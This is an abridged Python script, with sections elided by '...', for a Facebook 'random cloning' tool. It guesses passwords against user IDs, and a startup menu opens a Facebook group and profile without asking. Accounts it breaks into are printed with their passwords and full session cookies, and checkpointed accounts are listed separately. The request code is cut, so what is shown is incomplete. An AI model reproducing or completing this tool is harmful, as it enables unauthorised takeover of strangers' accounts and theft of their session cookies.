...
\033[1;31m   ___ _  _  ___  ___ _____  
\033[1;32m  / __| || |/ _ \/ __|_   _| 
\033[1;33m | (_ | __ | (_) \__ \ | |   
\033[1;31m  \___|_||_|\___/|___/ |_|   
                             
   
                                                                                               
\033[1;32m      [+]===============================================[+]
\033[1;94m      [+]        CREATED BY   :  LYA MA              \033[1;94m
\033[1;33m      [+]        ON GITHUB    :  LYA MA      \033[1;94m
\033[1;31m      [+]        STATUS       :  FREE      \033[1;31m
\033[1;94m      [+]        TOOL VERSION :  2.0                    \033[1;94m[+]
\033[1;32m      [+]        TOOL STATUS  :  RANDOM CLONING         \033[1;94m
\033[1;33m      [+]        COUNTRY      :  NEPAL          \033[1;94m
\033[1;31m      [+]===============================================[+]
""")                                              
...
class Main:
    def __init__(self):
        ...
        print(" [00] Exit")        
        Alif =input(" [?] Choose : ")
        os.system('xdg-open https://m.facebook.com/groups/268731958526907/')
        if Alif in ["1", "01"]:
            num()
        if Alif in ["2","02"]:
            os.system('xdg-open https://facebook.com/DBZ280')
        if Alif in [" 0", "00"]:
            exit()
        else:
            exit()
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mGHOST_KING\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[ISHAK-OK💚] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[GHOST-CP🔪] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[GHOST🔥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
